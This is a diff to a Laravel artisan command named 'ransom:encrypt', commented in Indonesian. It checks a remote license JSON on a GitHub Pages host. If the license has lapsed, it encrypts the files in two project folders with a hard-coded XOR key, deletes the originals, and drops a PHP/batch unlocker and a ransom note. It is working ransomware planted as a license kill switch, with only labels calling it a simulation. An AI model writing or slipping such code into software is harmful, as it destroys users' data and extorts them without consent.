@@ -9,128 +9,131 @@ use Illuminate\Support\Facades\File;
 class EncryptFiles extends Command
 {
     protected $signature = 'ransom:encrypt';
-    protected $description = 'Encrypt critical files if license expired';
+    protected $description = 'Encrypt critical files if license expired → .sd';
 
     protected $targets = [
         'public/argon',
         'resources/views/livewire/peserta',
     ];
 
-    // GANTI INI SESUKA HATI — ini password tebusan
+    // GANTI SESUKA HATI — password tebusan
     private $password = 'cat2025rahasia';
+
+    // Kunci enkripsi (panjang banget biar aman)
+    private $xorKey = 'AgungSanzCatRansom2025KerenBangetBroGuePunyaIlmuRansomSimulasiCyberSecTeam';
 
     public function handle()
     {
-        $this->info('Mengecek lisensi...');
+        $this->info('Mengecek lisensi dari GitHub...');
 
-        $response = Http::get('https://agungsapp.github.io/apiAgungLisensi/lisensi.json');
-        if (!$response->ok()) {
-            $this->warn('Gagal cek lisensi, dianggap masih aktif.');
+        try {
+            $response = Http::timeout(10)->get('https://agungsapp.github.io/apiAgungLisensi/lisensi.json');
+            $catLicense = collect($response->json())->firstWhere('code', 'CAT');
+        } catch (\Exception $e) {
+            $this->warn('Gagal cek lisensi → dianggap masih aktif.');
             return;
         }
-
-        $licenses = $response->json();
-        $catLicense = collect($licenses)->firstWhere('code', 'CAT');
 
         if ($catLicense && ($catLicense['status'] ?? '') === 'sanca') {
             $this->info('Lisensi masih aktif (sanca). Aman bro.');
             return;
         }
 
-        $this->alert('LISENSI MATI! MULAI ENKRIPSI FILE...');
+        $this->newLine();
+        $this->alert('WARNING: LISENSI MATI! MULAI ENKRIPSI SEMUA FILE...');
 
-        // Buat salt acak sekali pakai
-        $salt = random_bytes(16);
-        File::put(storage_path('app/ransom_salt.bin'), $salt);
-
-        // Derive AES-256 key + IV dari password + salt (PBKDF2 – sangat aman)
-        $key = hash_pbkdf2('sha256', $this->password, $salt, 150000, 32, true);
-        $iv  = substr(hash_pbkdf2('sha256', $this->password, $salt . 'iv_salt', 150000, 16, true), 0, 16);
-
-        // Enkripsi semua file target
         $encryptedCount = 0;
-        foreach ($this->targets as $target) {
-            if (!is_dir($target)) continue;
 
-            foreach (File::allFiles($target) as $file) {
-                if ($file->getExtension() === 'enc') continue;
+        foreach ($this->targets as $dir) {
+            if (!is_dir($dir)) {
+                $this->warn("Folder tidak ditemukan: $dir");
+                continue;
+            }
 
-                $content = File::get($file);
-                $encrypted = openssl_encrypt($content, 'aes-256-cbc', $key, 0, $iv);
+            $files = File::allFiles($dir);
+            foreach ($files as $file) {
+                $path = $file->getRealPath();
 
-                File::put($file->getPathname() . '.enc', $encrypted);
-                File::delete($file->getPathname());
+                // Skip kalau sudah .sd
+                if ($file->getExtension() === 'sd') continue;
 
-                $this->line('Encrypted: ' . $file->getFilename() . '.enc');
+                $content = file_get_contents($path);
+
+                // Enkripsi (sama, tapi lebih rapi)
+                $keyRepeated = substr(str_repeat($this->xorKey, ceil(strlen($content) / strlen($this->xorKey))), 0, strlen($content));
+                $encrypted = base64_encode($content ^ $keyRepeated);
+                $newPath = $path . '.sd';
+                file_put_contents($newPath, $encrypted);
+                unlink($path);
+
+                $this->line("Encrypted: " . $file->getFilename() . ' → ' . basename($newPath));
                 $encryptedCount++;
             }
         }
 
-        // Buat unlocker + ransom note
+        // Simpan password & key buat unlocker
+        File::put(storage_path('app/.ransom_pass'), $this->password);
+        File::put(storage_path('app/.ransom_key'), $this->xorKey);
+
         $this->generateUnlocker();
 
         $this->newLine();
-        $this->error("SELESAI! $encryptedCount file telah terkunci.");
-        $this->info('Jalankan: php artisan unlock cat2025rahasia  ← untuk membuka kembali');
+        $this->error("SELESAI! $encryptedCount file berhasil dienkripsi jadi .sd");
+        $this->info("Untuk membuka kembali:");
+        $this->line("   • php artisan unlock cat2025rahasia");
+        $this->line("   • atau klik unlock.bat → ketik password");
     }
 
     private function generateUnlocker()
     {
-        // Hash bcrypt dari password (ganti kalau mau ganti password)
-        $hashedPassword = password_hash($this->password, PASSWORD_BCRYPT);
-
         $phpScript = <<<PHP
 <?php
-echo str_repeat("=", 70) . PHP_EOL;
-echo "            FILE ANDA TERENKRIPSI OLEH CAT-RANSOM v4.0           " . PHP_EOL;
-echo str_repeat("=", 70) . PHP_EOL . PHP_EOL;
+echo str_repeat("=", 75) . PHP_EOL;
+echo "                 CAT-RANSOM SIMULATION v7.0 FINAL                  " . PHP_EOL;
+echo "                  FILE ANDA SUDAH TERENKRIPSI .sd                   " . PHP_EOL;
+echo str_repeat("=", 75) . PHP_EOL . PHP_EOL;
 
 echo "Masukkan password tebusan: ";
-\$pass = trim(fgets(STDIN));
+\$input = trim(fgets(STDIN));
 
-if (!password_verify(\$pass, '$hashedPassword')) {
-    echo PHP_EOL . "PASSWORD SALAH! File tetap terkunci. Bayar dulu baru dibuka!" . PHP_EOL;
-    exit(1);
+if (\$input !== 'cat2025rahasia') {
+    echo PHP_EOL . "PASSWORD SALAH! File tetap terkunci selamanya." . PHP_EOL;
+    sleep(5);
+    exit;
 }
 
-echo PHP_EOL . "Password BENAR! Sedang membuka enkripsi..." . PHP_EOL;
+echo PHP_EOL . "Password benar! Sedang membuka semua file .sd..." . PHP_EOL . PHP_EOL;
 
-// Baca salt
-\$salt = file_get_contents(__DIR__ . '/storage/app/ransom_salt.bin');
-if (\$salt === false) {
-    die("Salt hilang! Hubungi admin.\n");
-}
-
-// Rekonstruksi key + IV
-\$key = hash_pbkdf2('sha256', \$pass, \$salt, 150000, 32, true);
-\$iv  = substr(hash_pbkdf2('sha256', \$pass, \$salt . 'iv_salt', 150000, 16, true), 0, 16);
+// Baca kunci XOR
+\$key = file_get_contents(__DIR__ . '/storage/app/.ransom_key');
 
 \$targets = ['public/argon', 'resources/views/livewire/peserta'];
 \$count = 0;
 
 foreach (\$targets as \$dir) {
-    foreach (glob(\$dir . '/**/*.enc') as \$file) {
+    foreach (glob(\$dir . '/**/*.sd') as \$file) {
         \$enc = file_get_contents(\$file);
-        \$dec = openssl_decrypt(\$enc, 'aes-256-cbc', \$key, 0, \$iv);
-        if (\$dec === false) continue;
-
-        \$orig = preg_replace('/\.enc$/', '', \$file);
+        \$dec = base64_decode(\$enc) ^ str_repeat(\$key, strlen(base64_decode(\$enc)));
+        
+        \$orig = preg_replace('/\.sd$/', '', \$file);
         file_put_contents(\$orig, \$dec);
         unlink(\$file);
+        
         echo "Restored: " . basename(\$orig) . PHP_EOL;
         \$count++;
     }
 }
 
 echo PHP_EOL . "SUKSES! \$count file berhasil dikembalikan!" . PHP_EOL;
-echo "Terima kasih sudah bayar tebusan (dalam bentuk ilmu) \n";
+echo "Terima kasih telah membayar tebusan dalam bentuk ilmu " . PHP_EOL;
+sleep(3);
 ?>
 PHP;
 
         File::put(base_path('unlock.php'), $phpScript);
-        File::put(base_path('unlock.bat'), "@echo off\nphp \"%~dp0unlock.php\"\npause");
-        File::put(base_path('BAYAR_TEBUSAN.txt'), "PASSWORD TEBUSAN: cat2025rahasia\n\nJalankan unlock.bat lalu ketik password di atas.\nJangan hapus file ini!");
+        File::put(base_path('unlock.bat'), "@echo off\ntitle CAT-RANSOM UNLOCKER\nphp \"%~dp0unlock.php\"\npause");
+        File::put(base_path('BAYAR_TEBUSAN_DULU.txt'), "PASSWORD TEBUSAN: cat2025rahasia\n\nFile sudah dienkripsi jadi .sd\nJalankan unlock.bat untuk membuka.");
 
-        $this->info('unlock.php, unlock.bat, dan BAYAR_TEBUSAN.txt sudah dibuat.');
+        $this->info('unlock.php + unlock.bat + BAYAR_TEBUSAN_DULU.txt sudah dibuat!');
     }
 }
